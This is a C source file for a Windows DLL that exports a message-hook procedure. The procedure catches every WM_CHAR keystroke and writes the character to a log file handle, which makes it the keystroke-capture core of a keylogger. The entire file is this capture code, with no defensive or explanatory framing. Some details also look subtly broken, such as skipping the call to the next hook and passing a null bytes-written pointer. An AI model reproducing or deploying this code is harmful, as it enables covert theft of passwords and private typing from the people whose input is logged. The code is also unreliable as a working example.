#include "../inc/dll.h"

__declspec(dllexport) LRESULT GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        const LPMSG msg = (LPMSG)lParam;
        if (msg->message == WM_CHAR)
        {
            if (!(hFile == NULL || hFile == INVALID_HANDLE_VALUE)) {
                WriteFile(hFile, &(WCHAR)msg->wParam, 2, NULL, NULL);
            }
        }
        return 0;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}